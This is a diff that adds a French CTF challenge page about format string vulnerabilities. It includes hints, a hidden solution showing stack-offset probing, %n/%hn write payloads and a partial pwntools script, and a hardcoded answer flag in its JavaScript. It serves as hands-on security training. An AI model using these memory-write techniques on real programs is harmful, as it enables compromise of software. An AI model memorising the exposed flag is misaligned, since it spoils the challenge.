@@ -1,0 +1,249 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Challenge 07 - Format String | Try-Pwn-Me</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            background: #0a0a0a; color: #ffffff; min-height: 100vh; line-height: 1.6;
+        }
+        .container { max-width: 900px; margin: 0 auto; padding: 20px; }
+        header { padding: 40px 20px; border-bottom: 1px solid #2a2a2a; margin-bottom: 40px; }
+        .back-link { color: #888; text-decoration: none; display: inline-flex; align-items: center; gap: 8px; margin-bottom: 20px; transition: color 0.3s; }
+        .back-link:hover { color: #ffffff; }
+        .challenge-number { font-size: 0.8em; color: #666; text-transform: uppercase; letter-spacing: 2px; margin-bottom: 10px; }
+        h1 { font-size: 2.5em; font-weight: 700; margin-bottom: 15px; letter-spacing: -1px; }
+        .challenge-difficulty { display: inline-block; padding: 6px 16px; background: #1a1a1a; border: 1px solid #ff4444; margin-bottom: 20px; font-size: 0.85em; text-transform: uppercase; letter-spacing: 1px; color: #ff4444; }
+        .challenge-meta { color: #666; font-size: 0.9em; display: flex; gap: 20px; flex-wrap: wrap; }
+        .section { background: #141414; border: 1px solid #2a2a2a; padding: 35px; margin-bottom: 30px; }
+        .section h2 { font-size: 1.5em; margin-bottom: 20px; font-weight: 600; }
+        .section p { color: #aaa; margin-bottom: 15px; line-height: 1.8; }
+        .hint-box { background: #1a1a1a; border-left: 3px solid #ff4444; padding: 20px; margin: 20px 0; }
+        .hint-box strong { color: #ff4444; }
+        .objective-box { background: #0f0f0f; border: 1px solid #2a2a2a; padding: 25px; margin: 20px 0; }
+        .objective-box h3 { margin-bottom: 15px; font-size: 1.2em; }
+        .download-section { background: #0a0a0a; border: 2px solid #2a2a2a; padding: 30px; margin: 30px 0; text-align: center; }
+        .download-btn { background: #ffffff; color: #000000; border: none; padding: 15px 40px; cursor: pointer; font-family: inherit; font-size: 1em; font-weight: 500; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; text-decoration: none; display: inline-block; margin: 10px; }
+        .download-btn:hover { background: #e0e0e0; transform: translateY(-2px); }
+        .flag-submission { background: #0a0a0a; border: 1px solid #2a2a2a; padding: 30px; margin: 30px 0; }
+        .flag-input { width: 100%; padding: 15px; background: #141414; border: 1px solid #2a2a2a; color: #ffffff; font-family: 'Courier New', monospace; font-size: 1em; margin-bottom: 20px; }
+        .flag-input:focus { outline: none; border-color: #555; }
+        .btn { background: #ffffff; color: #000000; border: none; padding: 15px 40px; cursor: pointer; font-family: inherit; font-size: 1em; font-weight: 500; transition: all 0.3s; text-transform: uppercase; letter-spacing: 1px; width: 100%; }
+        .btn:hover { background: #e0e0e0; transform: translateY(-2px); }
+        .message { padding: 25px; margin: 20px 0; border: 1px solid #2a2a2a; display: none; }
+        .message.success { background: #0a1a0a; border-color: #224422; color: #44ff44; display: block; }
+        .message.error { background: #1a0a0a; border-color: #442222; color: #ff4444; display: block; }
+        .message h3 { margin-bottom: 15px; font-size: 1.3em; }
+        code { background: #1a1a1a; padding: 2px 8px; font-family: 'Courier New', monospace; color: #ddd; }
+        .code-block { background: #0a0a0a; border: 1px solid #2a2a2a; padding: 20px; margin: 15px 0; font-family: 'Courier New', monospace; overflow-x: auto; font-size: 0.9em; }
+        .tools-list { list-style: none; padding: 0; }
+        .tools-list li { padding: 10px 0; color: #aaa; border-bottom: 1px solid #1a1a1a; }
+        .tools-list li:last-child { border-bottom: none; }
+        .warning-box { background: #1a0a0a; border: 1px solid #ff4444; padding: 20px; margin: 20px 0; border-left: 3px solid #ff4444; }
+        .warning-box strong { color: #ff4444; }
+        footer { text-align: center; padding: 40px 20px; color: #666; border-top: 1px solid #2a2a2a; margin-top: 60px; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <a href="index.html" class="back-link">← Retour aux challenges</a>
+            <div class="challenge-number">Challenge 07</div>
+            <h1>Format String Vulnerability</h1>
+            <span class="challenge-difficulty">Difficile</span>
+            <div class="challenge-meta">
+                <span>💀 PWN</span>
+                <span>🎯 200 points</span>
+                <span>🔧 Format String</span>
+            </div>
+        </header>
+
+        <div class="section">
+            <h2>Description</h2>
+            <p>
+                Une vulnérabilité format string se produit quand un programme utilise un input 
+                utilisateur comme format string dans printf() ou des fonctions similaires. 
+                Cela permet de lire et écrire arbitrairement en mémoire.
+            </p>
+            <p>
+                Dans ce challenge, vous devez exploiter cette vulnérabilité pour modifier la 
+                variable <code>access_granted</code> et obtenir le flag.
+            </p>
+            
+            <div class="warning-box">
+                <strong>⚠️ PRÉREQUIS :</strong> Challenge avancé nécessitant Linux, gdb, et 
+                une bonne compréhension de la mémoire et des format strings.
+            </div>
+            
+            <div class="hint-box">
+                <strong>💡 Indice :</strong> Le programme affiche l'adresse de <code>access_granted</code>. 
+                Utilisez %x pour explorer la stack, trouvez l'offset de votre input, puis utilisez 
+                %n pour écrire la valeur 0x1337c0de à cette adresse. Attention au little-endian et 
+                aux techniques comme %hn pour écrire des valeurs spécifiques.
+            </div>
+        </div>
+
+        <div class="section">
+            <h2>Objectif</h2>
+            <div class="objective-box">
+                <h3>🎯 Mission</h3>
+                <p>Exploitez la format string pour écrire 0x1337c0de dans access_granted.</p>
+            </div>
+        </div>
+
+        <div class="download-section">
+            <h2 style="margin-bottom: 25px;">📥 Télécharger le Challenge</h2>
+            <p style="margin-bottom: 20px; color: #aaa;">
+                Binaire ELF 64-bit avec vulnérabilité format string
+            </p>
+            <a href="ctf-files/pwn_format_string.zip" class="download-btn" download>
+                📦 Télécharger Format String Challenge
+            </a>
+        </div>
+
+        <div class="flag-submission">
+            <h2 style="margin-bottom: 25px;">Soumettre le Flag</h2>
+            <input type="text" id="flag-input" class="flag-input" placeholder="TPM{...}" autocomplete="off">
+            <button class="btn" onclick="checkFlag()">Valider le Flag</button>
+        </div>
+
+        <div id="flag-message" class="message"></div>
+
+        <div class="section">
+            <h2>Outils et Concepts</h2>
+            <ul class="tools-list">
+                <li><strong>gdb + pwndbg :</strong> Analyser la stack et trouver les offsets</li>
+                <li><strong>pwntools :</strong> Automatiser l'exploitation</li>
+                <li><strong>%x, %p :</strong> Lire des valeurs sur la stack</li>
+                <li><strong>%n :</strong> Écrire le nombre de caractères imprimés en mémoire</li>
+                <li><strong>%hn, %hhn :</strong> Écrire 2 ou 1 byte(s) au lieu de 4/8</li>
+                <li><strong>Padding :</strong> Contrôler le nombre de bytes écrits</li>
+            </ul>
+        </div>
+
+        <div id="solution-section" class="section" style="display: none;">
+            <h2>✅ Solution et Explications</h2>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 1 : Trouver l'offset</h3>
+            <div class="code-block">
+# Tester différents formats pour localiser votre input sur la stack
+./format_string
+> AAAA%x.%x.%x.%x.%x.%x.%x.%x
+
+# Cherchez "41414141" (AAAA en hex)
+# Notez l'offset où votre input apparaît
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 2 : Écrire avec %n</h3>
+            <div class="code-block">
+# Une fois l'offset trouvé (par exemple 6):
+# Placez l'adresse de access_granted au début
+# Utilisez %[offset]$n pour écrire à cette adresse
+
+# Adresse (little-endian) + format string
+[adresse_8_bytes] + %[padding]c%6$n
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Étape 3 : Écrire 0x1337c0de</h3>
+            <div class="code-block">
+# 0x1337c0de = 322420958 en décimal
+# Utilisez %hn pour écrire par portions (2 bytes à la fois)
+
+# Technique avancée :
+# Écrire 0xc0de aux 2 premiers bytes
+# Écrire 0x1337 aux 2 bytes suivants
+# Utilisez des adresses consécutives et %hn
+            </div>
+
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Script Python avec pwntools</h3>
+            <div class="code-block">
+from pwn import *
+
+p = process('./format_string')
+p.recvuntil(b'@ ')
+leak = p.recvline().strip()
+addr = int(leak, 16)
+
+# Construire le payload
+# [à adapter selon votre offset]
+payload = p64(addr)
+payload += b'%[calcul]c%6$n'
+
+p.sendline(b'1')  # Se connecter
+p.sendline(payload)
+p.sendline(b'2')  # Vérifier accès
+p.interactive()
+            </div>
+            
+            <h3 style="margin: 20px 0 10px 0; font-size: 1.1em;">Comprendre Format String</h3>
+            <p><strong>Spécificateurs de format :</strong></p>
+            <ul class="tools-list">
+                <li><strong>%d, %x :</strong> Lire un int de la stack</li>
+                <li><strong>%s :</strong> Lire une string à partir d'une adresse</li>
+                <li><strong>%n :</strong> Écrire le nombre de bytes imprimés à une adresse</li>
+                <li><strong>%[N]$x :</strong> Accès direct au Nème argument</li>
+                <li><strong>%[N]c :</strong> Padding de N caractères</li>
+            </ul>
+            <p style="margin-top: 15px;"><strong>Exploitation :</strong></p>
+            <p>
+                En contrôlant la format string, on peut lire n'importe où en mémoire avec %s, 
+                et écrire n'importe où avec %n. C'est extrêmement dangereux.
+            </p>
+        </div>
+
+        <footer>
+            <p>Try-Pwn-Me - Challenge 07</p>
+        </footer>
+    </div>
+
+    <script>
+        function checkFlag() {
+            const flagInput = document.getElementById('flag-input').value.trim();
+            const messageDiv = document.getElementById('flag-message');
+            const correctFlag = 'TPM{f0rm4t_str1ng_pwn3d}';
+            
+            if (flagInput === '') {
+                messageDiv.className = 'message error';
+                messageDiv.innerHTML = '<h3>❌ Erreur</h3><p>Veuillez entrer un flag.</p>';
+                return;
+            }
+            
+            if (flagInput === correctFlag) {
+                messageDiv.className = 'message success';
+                messageDiv.innerHTML = `
+                    <h3>🎉 CHALLENGE RÉUSSI !</h3>
+                    <p>Impressionnant ! Format string exploitation maîtrisée.</p>
+                    <p style="margin-top: 15px; font-family: 'Courier New', monospace; font-size: 1.1em;">
+                        FLAG VALIDÉ: ${correctFlag}
+                    </p>
+                    <p style="margin-top: 20px; font-size: 0.95em; color: #888;">
+                        🎓 Les vulnérabilités format string sont parmi les plus puissantes en exploitation 
+                        binaire. Ne jamais utiliser printf(user_input) en production. Toujours utiliser 
+                        printf("%s", user_input) ou des alternatives sûres.
+                    </p>
+                `;
+                
+                // Afficher la section solution
+                document.getElementById('solution-section').style.display = 'block';
+                document.getElementById('solution-section').scrollIntoView({ behavior: 'smooth', block: 'start' });
+            } else {
+                messageDiv.className = 'message error';
+                messageDiv.innerHTML = `
+                    <h3>❌ Flag Incorrect</h3>
+                    <p>Continuez vos recherches !</p>
+                    <p style="margin-top: 15px; color: #888;">
+                        💡 Trouvez l'offset, écrivez l'adresse, utilisez %n avec padding calculé.
+                    </p>
+                `;
+            }
+        }
+
+        document.getElementById('flag-input').addEventListener('keypress', function(e) {
+            if (e.key === 'Enter') checkFlag();
+        });
+    </script>
+</body>
+</html>
